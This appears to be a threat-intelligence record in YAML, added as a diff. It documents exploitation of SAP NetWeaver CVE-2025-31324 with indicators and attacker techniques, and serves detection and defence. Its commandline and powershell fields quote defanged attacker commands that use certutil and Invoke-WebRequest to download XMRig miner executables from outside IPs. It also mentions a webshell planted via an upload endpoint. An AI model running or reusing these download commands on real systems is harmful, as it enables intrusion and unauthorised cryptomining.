@@ -1,0 +1,43 @@
+description: SAP NetWeaver CVE-2025-31324 Exploitation by Rob Anderson on 30 April
+  2025. Vulnerability added to CISAs KEV catalogue on 29/04/2025, reported unauthorised
+  file uploads and malicious code execution.
+attribution: ReliaQuest, WithSecure
+malware_families:
+- XMRig
+TTPs:
+  processes:
+  - certutil.exe
+  - helper.jsp
+  - jstart.EXE
+  commandline:
+  - cmd /c certutil -urlcache -split -f hxxp://23.95.123[.]5:666/xmrigCCall/1110.exe
+    C:\\Users\\Public\\1110.exe
+  - cmd /c certutil -urlcache -split -f hxxp://23.95.123[.]5:666/xmrigCCall/s.exe
+    C:\\Users\\Public\\s.exe
+  powershell:
+  - Invoke-WebRequest -Uri "hxxp://65.49.235[.]210/download/2.jpg" -OutFile "cmake.exe"
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - certutil.exe -> hxxp://23.95.123[.]5:666/xmrigCCall/1110.exe
+  - certutil.exe -> hxxp://23.95.123[.]5:666/xmrigCCall/s.exe
+  file_activity:
+  - D:\\usr\\sap\\POP\\J00\\j2ee\\cluster\\apps\\sap.com\\irj\\servlet_jsp\\irj\\root\\helper.jsp
+  - C:\\Users\\Public\\1110.exe
+  - C:\\Users\\Public\\s.exe
+  persistence:
+  - webshell deployment in /developmentserver/metadatauploader endpoint
+  pipes: []
+  process_relations:
+  - D:\\usr\\sap\\POP\\J00\\exe\\jstart.EXE -> cmd.exe -> certutil.exe
+IOCs:
+- 272b2fc48f6cbbf105cbe961b163de99e761b31d
+- 925f6bc2a3fb5bb15a434f5f42196d49f36459e3
+- 65.49.235[.]210
+- 23.95.123[.]5
+authors:
+- Rob Anderson
+reference: https://labs.withsecure.com/publications/netweaver-cve-2025-31324.html
+date_of_publication: April 30, 2025
+file_creation_date: July 28, 2025
